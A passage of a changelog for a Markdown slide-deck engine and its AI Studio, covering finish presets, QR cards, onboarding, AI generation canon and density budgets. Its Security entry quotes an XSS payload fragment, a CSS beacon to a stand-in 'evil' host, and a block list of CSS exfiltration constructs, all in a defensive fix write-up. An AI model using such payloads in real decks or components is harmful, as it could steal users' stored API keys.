  **preview-only**: the engine strips `data-debug` from every export, so exported
  PDF/PPTX/HTML bytes are identical whether a deck says `debug: on-hover` or not. A
  Playground toolbar toggle + Deck-setup switch give a per-session override
  (`on`/`off`/follow-the-deck). Demo: `examples/debug.md`; design:
  `engineering/decisions/2026-07-01-debug-bounding-boxes.md`. (Replaces the former
  Playground-only "bounding boxes" viewer toggle.)

### Fixed

- **The reference-doc picker's delete is now reachable on touch and by keyboard (#651
  follow-up).** Each row's trash was hover-revealed (and the active doc's was hidden
  outright until hover) — invisible on touch and awkward for keyboard users. It's now
  always present but muted, prominent on hover/focus, uniform for active and inactive
  docs; the active-row "grounding" check gained a screen-reader label.

### Changed

- **Breaking: `boardroom` and `sketch` moved off `finish:` onto a new `mode:` axis.**
  They were never backdrops — they're the deck's *rendering mode* (its typographic
  hand), so they now live on their own front-matter register: `mode: boardroom`
  (the clean default), `mode: sketch`, `mode: sketch-clean`. `finish:` keeps only
  the backdrops (`atrium` … `gallery`) plus a named `none` baseline. The two axes
  **compose** — `mode: sketch` + `finish: atrium` is a hand-drawn deck on an atrium
  backdrop — with no more one-register-does-two-jobs magic. A per-slide `_class:
  boardroom` opts one slide out of a deck-wide mode. (The key is `mode:`, not
  `style:` — Marp already owns `style:` for inline-CSS injection, so the axis is named
  for the *rendering hand* it selects.) **Migration:** change `finish: sketch` →
  `mode: sketch` and `finish: boardroom` → remove it (or `mode: boardroom`);
  `finish: sketch`/`boardroom` now lint-warn as unknown finishes and nudge to
  `mode:`. (`class: sketch` still works — it's the raw-class route.) The Studio
  Inspector splits its one Finish dropdown into a **Mode** row and a **Finish** row,
  and the deck-lint validates both keys.

### Added

- **Reference docs are now searchable to pick and manageable in the Library (#651).** The
  chat/Fabricate paperclip picker is now a **searchable** popover (search box + scroll), so a
  reference library of any size stays usable instead of a flat dropdown — rows show honest
  metadata only (type · size · added date; no fabricated "used in N decks"), the active doc is
  checked and still deletable, and "Add a file…" is pinned. A new **Docs tab in the Library**
  is the management home: every saved doc as a card with Download (rebuilds the original bytes)
  and delete, plus a contextual "Add file"; the picker's "Manage in Library" link opens straight
  to it. Design converged from a red-team + inversion + independent-checker pass (the reviews
  steered *away* from opening the full Library to select — selection stays in the composer). See
  `engineering/decisions/2026-07-01-studio-reference-docs.md`.

- **Studio AI can now be grounded in your own reference document (#640).** Attach a
  brand guide, an existing deck, or a content brief (`.txt` / `.md` / `.pdf`) and the
  Architect grounds theme, component, and deck-chat generation in it — "match this
  brand guide", "in the style of this deck". A live probe confirmed OpenRouter has no
  upload-by-id, so the path is **inline-only**: text/Markdown inlines as text; a PDF
  inlines as a file part parsed server-side by the `file-parser` plugin (cloud tier;
  on-device degrades honestly). Docs persist to a **shared library** (browser
  IndexedDB, reusable across every deck) — a paperclip picker offers "Add a file…"
  plus your saved docs, stored **locally and never uploaded**. The doc is treated as
  untrusted **data, not instructions** (HARD RULE #22 — framed behind an
  ignore-directives preamble; any generated HTML still crosses `sanitizeSlideHtml`),
  and its tokens fold into the pre-send budget estimate and the "billed each run"
  chip — honest cost, no implied free. See
  `engineering/decisions/2026-07-01-studio-reference-docs.md`.
- **`wifi` and `contact` QR-card components** (new `connect` bucket). Each renders
  a two-zone card — readable fields beside a scannable QR — from a postfix-key
  list where the value leads and a trailing inline-code names the field
  (`- Offsite-Guest \`ssid\``). `wifi` encodes the standard `WIFI:` payload
  (ssid/password/security; omit the password for an open network); `contact`
  encodes a vCard (name/title/org/email/phone/url). Every visible string is
  authored — an optional inline-code eyebrow and an optional `` `caption` `` field —
  with no unauthored editorial text. The QR is generated by a new
  synchronous, palette-blind encoder (`lib/engine/qr.js`, backed by the `qrcode`
  dependency) that runs on every render path via the shared transformer registry.
  See `examples/qr-cards.md`.
- **Finish marks and washes are now freely sized, moved, and tilted.** A finish's
  ghost glyph (monogram / numeral) is no longer locked to a corner at a fixed huge
  size — the recipe carries continuous `scale` / `x` / `y` / `angle` axes, so a mark
  can be a tiny corner emblem or a dramatic slide-spanning ghost, placed anywhere and
  rotated. Single-source washes (corner-glow, spotlight) gain a movable hotspot
  (`x` / `y`) and a `spread` reach. All axes round-trip through Save / Share / the AI
  recipe, stay export-safe (face-invariant transform, no new sinks), and the default
  ghost size dropped from ~40cqi to a tasteful 30cqi. Authored in the Finish Studio
  via a 3D joystick, drag-on-canvas handles, and numeric fields.
- **The brand logo can be moved and resized.** New `logo-x` / `logo-y` (0–100, the
  logo center as a % of the slide) and `logo-scale` (a multiplier) front-matter
  directives place the deck logo anywhere at any size — it defaults to the original
  top-right corner, so existing decks are unchanged. Honored identically across all
  three render paths (engine HTML, the runtime, the emulator); values are clamped and
  numeric-only, so a crafted value can't inject a style.
- **The Library now manages saved finishes too.** A fabricated finish saved to your
  library appears in the Library shelf (new **Finish** filter) with Apply · Share · Delete,
  mirroring themes and components — Share exports it as a `kind:"finish"` lattice-asset zip
  (the symmetric counterpart to the import that already existed). Closes the save→manage→share
  loop for finishes.
- **Prose-density budgets now cover every text-bearing layout (26 of 53).** The
  density backfill is complete: `kpi`, `glossary`, `list`, `list-criteria`,
  `list-tabular`, `timeline-list`, `compare-prose`, `decision`, `matrix-2x2`,
  `split-panel`, and `split-compare` gain a per-element word budget (each `hard`
  ceiling evidence-clamped under its measured overflow point via
  `tools/calibrate-density.js`). The remaining 27 layouts are deliberately exempt —
  data viz, code, figures, anchors, `[x]`-cell data grids, verbatim citations, and
  single-block prose already governed by the universal title/key-insight and
  whole-slide `wall-of-text` budgets (the boundary is documented in
  `engineering/decisions/2026-06-30-prose-density-budget.md` §6). Also: `density.axis`
  is no longer tied to `focusAxes` (focus highlighting ≠ markdown word-counting),
  so a ledger that highlights as rows but is authored as items — `glossary` — can
  be budgeted on its real `item` axis. **A Munger-inversion red team then found
  the budget was reaching no consumer** (the Drawing Board catalog never carried
  `density`, so it fired in neither the LLM prompt nor the review panel) and its
  `hard` message falsely claimed *"it will overflow"* — so this release also wires
  it for real: each layout's budget now rides into the LLM authoring primer as a
  `Budget:` line, the CLI (`lint:deck`) surfaces density suggestions alongside lint,
  the message is reworded to the honest *"reads as a wall of text"* (an editorial
  threshold, not a physical-overflow claim — the Fit Spine owns overflow), and a new
  `checkDensityCoverage` gate (`build:check`) keeps every prose layout budgeted-or-
  exempt so coverage can't rot. See the decision doc §9.
- **Finish presets — a palette-blind, STACKED-LAYER surface layer for decks (the
  `field` zone of the Finish family).** Five premium `finish:` register values —
  `atrium` (glow + grid + left rule), `meridian` (diagonal duotone + contour
  lines + ghost numeral), `strata` (soft bands + dot-matrix + corner tick),
  `halo` (centered spotlight + concentric rings + vignette), and `ledger` (ruled
  lines + bold left bar + corner fold) — paint a faint,
  theme-recoloring composition behind every slide, set deck-wide in one line of
  front matter (`finish: atrium`) or per-slide via `_class: finish finish-<name>`;
  `finish-none` (back-compat `backdrop-none`) opts a slide out. Each preset is
  built on a **per-role custom-property layer compositor** (`--fin-wash` /
  `--fin-texture` / `--fin-mark` / `--fin-edge` blended in one rule on
  `section.finish`), so layers combine by z-index instead of being either/or and a
  future right-panel designer can drive any single layer by setting one prop. A
  per-slide finish (`_class: finish finish-<name>`) **overrides** the deck-wide one
  rather than stacking on it — the propagation drops the deck's `finish-*` preset
  when a slide carries its own (or `finish-none`), so two finishes never composite
  on one section. All layers are pure CSS gradients with NO `mask-image` (drops in
  Apple PDFKit) and NO `url()`. Every full-bleed fade is **opaque-to-opaque**
  (`color-mix(var(--accent) N%, var(--bg))` → `var(--bg)`), never to `transparent`
  — Chromium's print-to-PDF encodes an alpha area-fade so PDF rasterizers (poppler
  AND Ghostscript both confirmed) interpolate toward transparent-black and bake in
  a gray cloud; opaque-to-opaque exports clean. Patterns are uniform and faint
  (thin opaque lines, `transparent` gaps), so they survive PDF/PPTX export, add no
  remote-`url()` surface, and stay subtle enough to keep text at AA contrast with
  no scrim. New `lib/base/base.finish.css`
  (replaces the prior single-value backdrops); `FINISH_REGISTER`
  (`lib/core/resolve-finish.js`) — the single source of truth read by all three
  render paths — carries the five presets, gated against the CSS by a rot-guard.
  The Studio Inspector's swatch-previewed **Finish** field (grouped Plain /
  Finishes) writes the register. Demo: `examples/finish-backdrops.md`. See
  `engineering/decisions/2026-06-30-finish-the-surface-layer.md`.
- **Four more premium finish presets + four new layer types — leaning into
  tunable + movable layers.** Adds `finish: nimbus` (a new **mesh** wash — 3–4
  soft overlapping radial accent blooms summed into an organic gradient-mesh
  atmosphere, seated by a vignette; the wash intensity tunes the bloom strength),
  `loom` (a new **lattice** texture — a woven ±45° diagonal cross-hatch, on-brand
  for the product, with a *movable* corner glow; tune the weave scale, move the
  glow), `savile` (a new **pinstripe** texture — fine vertical lines whose pitch
  the scale tunes — plus a *movable* monogram mark), and `gallery` (a new
  **frame** edge — a thin inset keyline border drawn as four crisp accent strips,
  no soft-shadow alpha — plus a spotlight and a *movable* numeral). All four are
  palette-blind (`color-mix(var(--accent)/var(--bg)/var(--ink))`), export-safe
  (every full-bleed fade is opaque-to-opaque; tiled patterns use a hard 1px
  `transparent` gap, never an area fade; no `mask-image`, no `url()`, no hex), and
  ride the same dual-face (rich-on-screen / opaque-on-export) compositor as the
  first five. The new layer types extend the Studio recipe vocabulary
  (`WASH_TYPES`/`TEXTURE_TYPES`/`EDGE_TYPES`) and gradient builders, so a
  fabricated finish can use them too. `FINISH_REGISTER`, the catalog, the
  recipe↔engine gate, and the demo deck (`examples/finish-backdrops.md`) all carry
  the four. See `engineering/decisions/2026-06-30-finish-the-surface-layer.md`.
- **Finishes are now rich-on-screen and safe-on-export — a dual-variant per
  preset.** On screen (live preview, presenter, web, docs) each finish shows the
  richer "dissolving" look of the mockups: the pattern fades directionally toward
  a corner, a glow blooms to nothing, rings thin out — fades that run to
  `transparent` (alpha), which the browser composites perfectly. For any export
  the engine automatically falls back to the **opaque** look (every full-bleed
  fade ends on `var(--bg)`, patterns uniform-faint) — the only PDF-clean form,
  since Chromium's print-to-PDF bakes an alpha area-fade into a gray cloud. The
  rich value is each preset's slot default; an `--fin-*-opaque` mirror per preset
  holds the export value, and a single guarded block re-points the slots for
  **both** export paths — `@media print` (the CLI vector PDF) and
  `.lattice-exporting` (the Studio html-to-image raster, which now tags each
  section before capture so the clone inherits the opaque face). The two guards
  share one declaration list and the opaque values live only on the presets, so
  the faces can't drift. Both faces stay palette-blind with NO `mask`/`url()`/hex/
  `margin`; only the screen face uses alpha, and only where it never reaches a
  PDF. Fabricated finishes (`generateFinishCss`) emit the same dual variant.
- **Finish faculty — a right-panel layer designer in the Studio, a sibling of the
  Theme + Component studios.** The Fabricate "Finish" tab is now a real designer
  rather than a slider tool: a live preview specimen in the center, a **right-panel
  layer stack** (Wash · Texture · Mark · Edge) — each an Inspector group with a type
  `Select` over the engine vocabulary (Wash: corner-glow / duotone / spotlight /
  bands; Texture: grid / dots / hatch / contour / rings / ruled; Mark: monogram /
  tick / bar / numeral; Edge: vignette / margin-rule / fold) plus an intensity
  slider and a placement control — a **"Start from preset"** row (Atrium / Meridian /
  Strata / Halo / Ledger) that populates the four layers, a name + **Export** +
  **Save** header, and an AI **"Describe a finish"** command bar. The controls drive
  a deterministic generator that emits a `section.finish.finish-<slug> { --fin-wash:…;
  --fin-texture:…; --fin-mark:…; --fin-edge:… }` rule through the SAME engine
  compositor — opaque-to-opaque gradients only (no `transparent` area-fade, no
  `mask`, no `url()`, no hex), with the slug re-sanitized in the generator (defense
  in depth, HARD RULE #22). The AI proposes a **structured recipe** (the four layers
  + params from the closed vocabulary, validated/coerced before it drives the
  controls), never raw CSS, so model text never reaches the preview frame; it
  degrades honestly when no model is connected. **Save is wired end-to-end** this
  time: a new `finish-library.ts` (IndexedDB, the shared Workbench asset store,
  `kind:'finish'`) persists designed finishes; the Inspector Finish menu gains a
  **Saved** group + a Manage-saved list, and picking a saved finish injects its CSS
  into the deck preview `extraCss` AND applies its `finish finish-<slug>` class — so
  a custom finish actually renders in the deck (and in Share/Present export).
  Responsive across 1440 / 820 / 390. See
  `engineering/decisions/2026-06-30-finish-the-surface-layer.md` (the REDESIGN
  callout).
- **Finish portability + safety hardening (review follow-up).** Several fixes
  closing gaps in the saved-finish loop: (1) **a saved finish no longer clobbers a
  deck's own `class:`** — the `finish finish-<slug>` stamp is now MERGED (deduped
  union) into any existing classes (`class: dark wide` survives), and is applied
  only to the render/artifact paths (preview, Present, PDF/PPTX/Print), never the
  editable source. (2) **A custom finish now travels with a shared deck** — the
  Markdown/Marp source handoff embeds the finish's generated CSS as a self-contained
  `<style>` block (mirroring the theme embed) instead of emitting a phantom `class:`
  that wouldn't resolve and would trip the deck-lint; and the **lattice-asset share
  format gained a `kind:'finish'`** (manifest + `<slug>.finish.css` + recipe JSON),
  packed/unpacked symmetrically into the finish library. (3) A monogram/numeral mark
  can now **carry the author's own glyph** (their initials or a section number),
  sanitized for the CSS `content:` sink — no longer hardcoded "L"/"03". (4) A new
  **Export-preview toggle** in the Finish faculty shows the opaque export face on the
  live specimen, so the designer sees the flatter baked look before shipping. (5) A
  saved finish whose name collides with a built-in (the five presets, `boardroom`,
  `sketch`, `none`, `preview`, …) is now **namespaced** (`atrium` → `atrium-custom`)
  so it can't shadow a preset; `lattice-exporting` is documented as an engine-reserved
  class. (6) The treatments compositor's broad `[class*="backdrop"]` selector is
  tightened to the exact `[class~="backdrop-none"]` token. A new build-time/unit gate
  asserts the faculty's `PRESET_RECIPES` mirror stays structurally in sync with the
  rendered truth in `base.finish.css` (no silent recipe↔engine drift), and the AI
  recipe path gains unit coverage.
- **Studio onboarding, polished further.** Three follow-ups to the newcomer
  onboarding: (1) a newcomer's **topbar is trimmed to essentials** — the advanced
  cluster (Library, Workspace settings, Focus, the Fabricate launcher item) is
  hidden until they engage, then reveals on graduation; (2) the **welcome deck is
  now offered to returning users** via a one-time, deletable migration that appends
  it to their deck list (never hijacking the active deck); (3) the deck **Inspector
  toggle gives a gentle one-time pulse** after the Coach reveals, so it's
  discoverable without auto-opening settings on a slide click. Design:
  `engineering/decisions/2026-06-30-studio-onboarding-followups.md`.
- **Studio Focus mode — a transient "quiet the noise" view.** The Studio's
  four-column desktop layout (Architect · Editor · Preview · Inspector) can now
  collapse to just **Editor + Preview + slide nav**, with most of the topbar
  hidden, so a power user — or anyone mid-draft — can concentrate without losing
  any capability: the ⌘K command palette stays live, so every feature is one
  keystroke away. Enter via the Focus button in the topbar, `⌘.`, or the command
  palette; leave with the Exit-focus control, `Esc`, or `⌘.`. Opt-in per session
  (not sticky, not a default); entering Fabricate exits it. Design + rationale:
  `engineering/decisions/2026-06-30-studio-focus-mode.md`.
- **Studio AI now writes deck content in a language you choose.** A new **Output
  language** picker in the Workspace drawer's *Instructions* tab sets the locale the
  Architect writes slides, prose refine, and chat in (BCP-47, e.g. `en-US`, `en-GB`,
  `fr-FR`). It seeds from your browser on first run (`navigator.language` → a supported
  code, else `en-US`) and is yours to override; the choice persists per workspace. This
  fixes the AI defaulting to British-leaning prose. Scope is deliberate — **deck content
  only**: generated component and theme names, CSS, and `_class` directives stay in
  canonical English so they keep passing the gates and resolving at render time. Latin-script
  languages for now; the list is data-driven (`docs/src/components/studio/studio-language.ts`).
  Also wired up the previously-dead "Standing instructions" field (it was saved but never
  sent) through the same path. See
  `engineering/decisions/2026-06-30-studio-output-language.md`.
- **Studio newcomer onboarding — a starter deck that is the pitch.** A first-time
  author now opens into a crafted 7-slide "Welcome to Lattice" deck — brief, a
  different component per slide (`title` · `big-number` · `stats` · `cards-grid` ·
  `split-compare` · `list-steps` · `closing`), a genuine boardroom deck that teaches
  the system by being read, then edited or replaced. It comes with a reduced-density
  first-run shell: the side panels start closed (editor + preview + the deck lead,
  not 35 controls), a one-time dismissible welcome cue points at the Coach and deck
  settings, and the AI Coach reveals itself on the first edit. A persisted
  `onboarded` flag makes the whole treatment strictly one-time, and prior Studio
  users are detected and treated as already-onboarded. Design + rationale:
  `engineering/decisions/2026-06-30-studio-newcomer-onboarding.md`.

### Fixed

- **Finish glyph-marks no longer paint a baked placeholder on every slide.** A
  glyph-mark (the ghost monogram / numeral) is now **author-personalized and never
  appears in a finish by default** — a deck-wide `finish:` register (or a per-slide
  `finish-<name>`) paints **no glyph at all** until an author sets one. Previously
  the `meridian`/`gallery` (numeral) and `savile` (monogram) presets baked a literal
  `"03"`/`"L"` into the mark slot, so applying a finish deck-wide stamped the same
  wrong mark — e.g. a giant faint "03" — on every slide regardless of its real
  position. The mark layer/type is unchanged (the Studio designer still offers it,
  and authors can set the glyph in the Studio's *Initials*/*Number* field or via a
  `<style>section.finish-<name> { --fin-mark-text: "…"; }</style>` slot); only the
  default rendered text went empty (engine `base.finish.css`; the Studio generator's
  `sanitizeGlyph` now yields `""` for an empty glyph). Demo `examples/finish-backdrops.md`
  opts its meridian/savile/gallery slides into explicit glyphs to showcase the
  movable mark while proving the clean no-glyph default.
- **Studio editor no longer collapses when the Architect panel is closed.** The
  desktop grid declared a fixed `0px` first column for the (conditionally rendered)
  Architect, so closing it dropped the editor into the zero-width track. The column
  set now matches the rendered children.
- **Studio inline validation no longer false-flags valid components.** The "unknown
  component" check used a hardcoded 11-name list instead of the real 53-component
  catalog the Studio is already handed, so valid components (`split-compare`,
  `list-steps`, and ~40 others) were underlined as errors on perfectly good decks.
  The known set now derives from the catalog (`dist/docs/components.json`).

### Changed

- **Studio AI component canon now teaches odd/fixed-aspect shapes to fill the stage, not float or overflow (#610, #643 spike).**
  Live validation (#639) found the "design for fit" canon reasons about element *count* and *monumentality* but not about how a
  non-rectangular or fixed-aspect shape (hexagon, disc, stamp, film frame) distributes into the 16:9 stage — so hexagon tiles
  overflowed the bottom, avatar discs and film strips floated small in a sea of empty, and signposts broke. A new **"shape must earn
  the stage"** bullet (`lib/layout/ai.js` `COMPONENT_CANON`) teaches the fix as the *same flex-fill mechanism as a card grid*, applied
  to the shape: make the shapes a `flex:1 1 0` row so the band grows to the full stage height, then give each shape its ratio
  (`aspect-ratio`/`clip-path`) *inside* that grown cell — so N shapes sit edge-to-edge in one stage-filling band, never a thin ribbon
  mid-slide; a strip/band form grows its frames (`flex:1`) or stacks. **Evidence (blind K=5 OLD-vs-NEW controlled trial, 60 renders —
  6 odd-shape prompts × 5 samples × two canon arms, DOM `.cell-stage` overflow + full visual audit):** the fix cuts the *destructive*
  failure — overflow incidence **0.47 → 0.33**, mean overflow magnitude **0.665 → 0.506** — with the hex/margin/font gates **unaffected**
  (gate pass 0.83 → 0.80, ±1 sample). Clear wins on honeycomb (overflow eliminated) and maptrail (huddled signs → filling stacks); stamps
  partial; filmstrip/polaroid a wash; disc-avatars a slight regression. The improvement is *directional, not guaranteed* (the model applies
  the mechanism unevenly, so some strips/grids still float in a given draw — the same partial-effect pattern documented for prompt guidance
  in #644); it trades destructive overflow (clipped content) for a milder underfill/collapse (dead space, no content lost). An earlier draft
  also tried a *scattered-layout* clause; it regressed the margin gate (scatter nudged the model to `margin`) without reliably helping,
  so it was dropped — the shipped bullet is the flex-fill mechanism only. Generator guidance only — no gate or runtime change; the
  frozen adversarial eval stays 18/18 and the odd-shape gate-clean rate is unchanged. Rationale in
  `engineering/decisions/2026-06-29-ai-component-generation.md` §11.
- **Studio topbar information architecture — appearance grouping + one responsive `⋯` overflow.**
  The topbar no longer crowds ~15 controls into one 54px row on a phone. On **desktop (≥1100)**
  the theme picker and light/dark toggle are grouped into one bordered **Appearance segment**
  (the mode toggle kept a direct 1-tap button), and the bar stays full. On **compact (≤1099 —
  portrait + landscape phone + tablet)** the genuinely-secondary controls — theme picker,
  Library, Workspace settings, and a "Search / commands" row (the touch path to the ⌘K palette)
  — fold into a single trailing `⋯` overflow menu, while **Present, Share, Architect, Inspector,
  and the light/dark toggle stay primary** (one-tap, never buried). The desktop ⌘K pill is gated
  to ≥1100 so it never doubles the in-`⋯` Search row; the `⋯` menu resets on every breakpoint
  change. Reuses `ThemeMenuItems` + the Radix `DropdownMenu`/sub primitives + the existing
  CommandPalette (no new widgets). Verified at 390 / 844 / 820 / 1440 in light and dark. Design:
  `engineering/decisions/2026-06-30-studio-topbar-ia.md`.

- **Studio AI calls now cache the static system prefix — ~85% off input on a fan-out (#610).**
  Profiling showed every component-generation call re-ships a byte-identical ~7.3K-token system
  prompt (the authoring canon + worked examples), re-billed in full each time. `withCachedSystem`
  (`docs/src/playground/architect-model.js`) now marks the leading `system` block with a
  `cache_control:{type:"ephemeral"}` breakpoint for the vendors that need an explicit one
  (anthropic, google; openai/deepseek/x-ai auto-cache and are left as plain strings). The
  breakpoint sits on the system message, so the varying user turn and any dedup-neighbor block
  stay outside the cached prefix; within the ~5-min TTL, calls after the first read the prefix at
  ~0.1× instead of 1×. Zero quality change (the full canon + all examples still ship); below a
  provider's min cacheable size the breakpoint is a silent no-op. The `usage.cost` we record
  reflects the discount, so the spend tally stays authoritative. Also documented (decision doc
  `2026-06-29-studio-spend-budget.md`): the OpenRouter **file-upload** API is the wrong tool for
  the static canon — referencing a file still bills its content as input tokens every call — so
  it stays reserved for user-supplied reference docs, not cost reduction.
- **Studio AI component generator now reasons about content fit, the word budget,
  and responsive reflow (#610).** The component-generation canon (`lib/layout/ai.js`
  `COMPONENT_CANON`) gained three teaching bullets that target the recurring
  stress-test failures — sparse dead-space slides, body-sized KPI numbers, and
  multi-column drafts with no portrait rule. **Design for fit**: the structure must
  earn its `capacity` (the sweet count fills the stage; the hard count sits just below
  overflow; a one-number payload goes monumental via `--fs-hero`/`--fs-emphasis`), and
  the model is told to size `capacity` to what *this* layout truly holds rather than a
  boilerplate `{4,6,8}`. **Write to the word budget**: the generator now emits and
  honors a `density` block (the per-element words-per-element budget already in the
  manifest schema), with `coerceDensity` snapping `axis` to the two the counter
  measures (`item`/`row`) and the design-audit flagging an incoherent `soft > hard`.
  The budget is now threaded end-to-end — through the architect draft, the Studio
  **Manifest** panel (a new Density field: axis + soft/hard, alongside Capacity), the
  JSON round-trip, and `saveStudioComponent` — so a generated component persists the
  budget the reviewer reads, rather than dropping it.
  **Responsive by construction**: the `@container lattice` single-column reflow is
  taught as part of the first draft, not a follow-up. **Prefer flex over grid**: the
  multi-column bullet now makes `display:flex` the default layout primitive and reaches
  for `grid` only with a proven two-dimensional-alignment reason (and a true matrix is
  usually tabular data → a `<table>`); the two-column comparison worked example is
  rebuilt on flex (`flex:1 1 0` per side, `flex-direction:column` reflow) to model it.
  The worked examples now carry a `density` block, and the output contract requests one. No gate or runtime behavior
  changes for existing components — this is generator guidance plus the new advisory
  and the manifest-editor field.
- **Studio AI component canon now keeps creative components gate-clean — token paths for
  every creative need (#610, #639 follow-up).** Live validation against a real model
  (`#639`) showed the canon's *creative ceiling* is excellent — distinctive boarding-pass,
  terminal, receipt, and monumental-KPI components all render at a genuine 9/10 — but
  gate-*survival* collapsed under creative pressure: roughly 60% of distinctive prompts
  emitted a non-zero `margin` or a raw `hex`, so a visually-excellent component was rejected
  by the gate before it could ship. The two root causes were that the canon forbids both but
  gives no *token path* to the creative need. The DARE bullet (`lib/layout/ai.js`
  `COMPONENT_CANON`) now supplies both: **all positional play is a `transform`** —
  `rotate()` a stamp, `translate()` to scatter/overlap/hang/nudge — never a `margin` (which
  corrupts the stage's height math and fails the gate); and **every concept color has a
  token recipe** so a named color never drives a hex — a dark terminal/console panel inverts
  the existing tokens (`background:var(--text-heading); color:var(--bg)`), status/traffic-light
  dots are `--fail`/`--warn`/`--pass`, and a material tint (post-it yellow, kraft, a colored
  stamp) is `color-mix(in srgb, var(--cat-3-mark) 12-22%, var(--bg))` over the categorical ramp.
  **Evidence (controlled old-vs-new trial, K=4, 32 hot-prompt trials per arm — separates the
  canon's effect from sampling noise):** hot-prompt gate-failures fall **53% → 34%**, and the rule
  breakdown shows *why* — **`hex` failures go 8 → 0** (decisive: `terminal` and `stickynotes` both
  flip 0/4 → 4/4, driven by the color-token recipes), while **`margin` failures are flat (12 → 11,
  within noise)** — the transform-for-offset half doesn't reliably move margin behavior (`receipt`/
  `polaroid` stay margin-stubborn). So the proven win is the **concept-color token path** (a
  terminal/sticky/traffic-light component that was *always* rejected on hex now ships); the margin
  guidance is correct and harmless but statistically neutral. Generator guidance only — no gate or
  runtime change; the frozen adversarial eval stays 18/18. (An earlier single before/after run
  suggested 9/15 → 3/15, but that conflated the effect with sampling variance — the controlled trial
  is the real measure.) Validation report on `#639`; full trial + canon rationale in
  `engineering/decisions/2026-06-29-ai-component-generation.md` §11.
- **Studio component gate now enforces margin discipline (#20) and token typography
  (#4) — the design-audit (#610).** The local/AI component authoring gate
  (`lib/layout/gate.js` `gateCss`) previously checked only hex/scope/exfil, so a draft
  with a non-zero `margin` or a raw-length `font-size` (`18px`, `2cqi`) rendered anyway —
  exactly the "non-native" tells the component-generation design
  (`engineering/decisions/2026-06-29-ai-component-generation.md`) calls out. Two new
  deterministic checks (`findMargins`, `findRawFontSize`) flag them as blocking errors,
  steering authors to `gap`/`padding` and the `--fs-*` role tokens every shipped
  component uses (`em`/`%`/`inherit` and `var(--fs-*)` stay allowed). The two Studio
  starters that themselves violated #20 (`feature-band`'s centered divider, `two-col-list`'s
  `columns` layout) are rebuilt margin-free (flex / grid with `gap`) so the templates model
  the rule. The `> .cell-stage` root and `adapt`/`capacity` checks from the design are
  deliberately deferred — the former is a *shipped*-component trait (local components scope
  to `section.<name>` directly), the latter a graduation-path advisory.

### Security

- **Untrusted-content XSS + CSS exfil hardened in the Studio preview (#616, #610).** Two
  surfaces were exploitable *today*, before any transformer change, now that components
  and decks are shareable + AI-generable: (1) engine-rendered slide HTML (markdown with
  `html: true`, no sanitizer) was written into a same-origin, un-sandboxed `srcdoc`
  preview frame, so a shared/AI deck or component skeleton carrying `<img src=x
  onerror=…>` executed in the app origin and could read the OpenRouter key from
  `localStorage`; (2) the local-component CSS gate blocked only scope/hex, not `@import`
  / remote `url()` / `expression()` — a live `background:url(//evil/?leak)` beacon and
  attribute-leak exfil channel. **Fix:** a single upstream `sanitizeSlideHtml`
  (`docs/src/lib/sanitize-slide-html.js`, DOMPurify) now runs at every preview-frame
  builder — stripping scripts, event handlers, and dangerous URLs while preserving
  legitimate chart SVG, MathML, tables, and inline-`style` `url()` backgrounds — and
  `findCssExfil` (`lib/layout/gate.js`) blocks `@import` / remote `url()` /
  `expression()` / `-moz-binding` / `javascript:` in component CSS (inline `data:` and
  `#fragment` refs stay allowed). Sanitizing is a no-op on legitimate decks, so no
  exported artifact's bytes change. Closes the §5.1 preconditions in the
  component-transformer threat model. Independently red-teamed in real Chromium
  (key-exfil harness, full mXSS catalog + the Mermaid `securityLevel:'loose'` path —
  0 bypass) and assessed — both clean; DOMPurify pinned `^3.4.11` (past the patched
  2026 CVE cluster). **Regression-gated:** new HARD RULE #22 + `checkPreviewHtmlSinks`
  (`tools/check-ownership.js`, via `build:check`) fail the build if any preview-frame
  builder stops sanitizing or a new un-sanitized one is added; the killer payloads are
  locked in a permanent XSS corpus test.

### Added

- **Prose-density budget — give the LLM a word budget, not just an element count (phase 2 of
  the content-capacity contract).** Layouts now declare an optional `density` block
  (`{ axis, soft, hard }`) — where `capacity` budgets how many elements fit, `density` budgets
  how many WORDS each element gets before the slide loses brevity. A universal table budgets the
  cross-cutting chrome regardless of layout (eyebrow ≤ 5 words, title ≤ 10, subtitle ≤ 12,
  key-insight ≤ 18, pill ≤ 2; `lib/authoring/prose-budgets.js`). Budgets are expert-seeded (the
  presentation canon + `editorial.md`) and evidence-clamped: `tools/calibrate-density.js` renders
  a layout at rising word counts and reads the real overflow probe, so a `hard` ceiling is never
  above where it physically breaks. Surfaced to agents in `dist/docs/components.json` and the
  generated `**Density**` docs line; enforced advisorily as Drawing Board review **suggestions**
  (`density-crowd` / `density-overflow`, `verbose-eyebrow` / `verbose-subtitle` /
  `verbose-key-insight`) — never a blocking lint warning, so the stress galleries stay free.
  Seeded on the 15 text-bearing layouts (`cards-grid`, `cards-stack`, `actors`, `inventory`, `list-steps`, `stats`,
  `verdict-grid`, `compare-table`, `q-and-a`, `agenda`, `checklist`, `kanban`, `authority-chain`, `regulatory-update`,
  `statute-stack`), each `hard` ceiling clamped under its measured geometric break — the calibrator caught `q-and-a`
  at 18 words/answer, far tighter than analogy would suggest. Demo: `examples/prose-density.md`. See
  `engineering/decisions/2026-06-30-prose-density-budget.md`.
- **Studio — AI component generation now covers the full transform-free set: code + math (#610).**
  The "Describe a component" generator reliably produces **code** (a fenced sample card, a side-by-side
  code comparison) and **math** (a labeled formula callout) components — pure CSS framing around the
  fenced/`$$…$$` blocks the engine already highlights/renders. A probe confirmed the model generates
  these gate-clean with real fenced/math content, so the frozen held-out set gained a `mustFence` and a
  `mustMath` case (asserting a real ```fence / `$$…$$`, never faked as prose) and runs **18/18** against
  a real model. The boundary holds: a highlighted render *with line numbers* is a transform and still
  routes to the code bucket. No API change.

- **Studio — AI component generation: markdown-structure literacy + a pure-markdown skeleton gate
  (#610).** The component knowledge file now teaches the model to author in the **markdown structure
  that fits the data** — **lists** for sets, real **GFM tables** for a matrix that reads across
  columns (styled `section.<name> table/thead th/td` with tokens + `border-collapse`, never faked
  with a grid of divs), prose, fenced code, and math — plus the **load-bearing slide grammar**
  (eyebrow → title → subtitle → content → key-insight → below-note; chrome is auto-detected by
  POSITION, and inline `code` reads as eyebrow vs pill vs label by where it sits) and the universal
  **`[x]`/`[-]`/`[ ]`/`[/]` state-marker grammar** for rows that carry a true status axis (never a
  raw emoji). A fifth gate-verified worked example (a matrix as a real table) anchors it. The
  skeleton is now enforced as **pure markdown**: `gateComponent` rejects ANY raw HTML tag
  (`findSkeletonHtml`) — the `<script>`/`<style>`/`<iframe>` XSS set AND benign tags like
  `<div>`/`<br>` — while keeping code shown in `` `inline` ``/```fences and the `<!-- … -->` comment
